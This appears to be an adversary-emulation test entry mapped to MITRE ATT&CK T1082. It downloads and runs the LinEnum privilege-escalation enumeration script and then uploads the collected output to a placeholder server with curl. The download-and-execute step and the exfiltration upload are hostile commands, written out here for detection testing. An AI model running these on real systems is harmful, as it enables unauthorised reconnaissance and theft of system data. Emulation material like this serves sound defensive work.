## Linux Enumeration & Privilege Escalation Discovery Script
MITRE ATT&CK: T1082 (System Information Discovery)
Tactic: discovery

Download and execute LinEnum.sh

### Commands (linux/sh)
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;
chmod +x LinEnum.sh;
./LinEnum.sh > /tmp/exfil.txt;
curl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;
cat /tmp/exfil.txt;
```

### Cleanup
```bash
rm ./LinEnum.sh;
rm /tmp/exfil.txt;
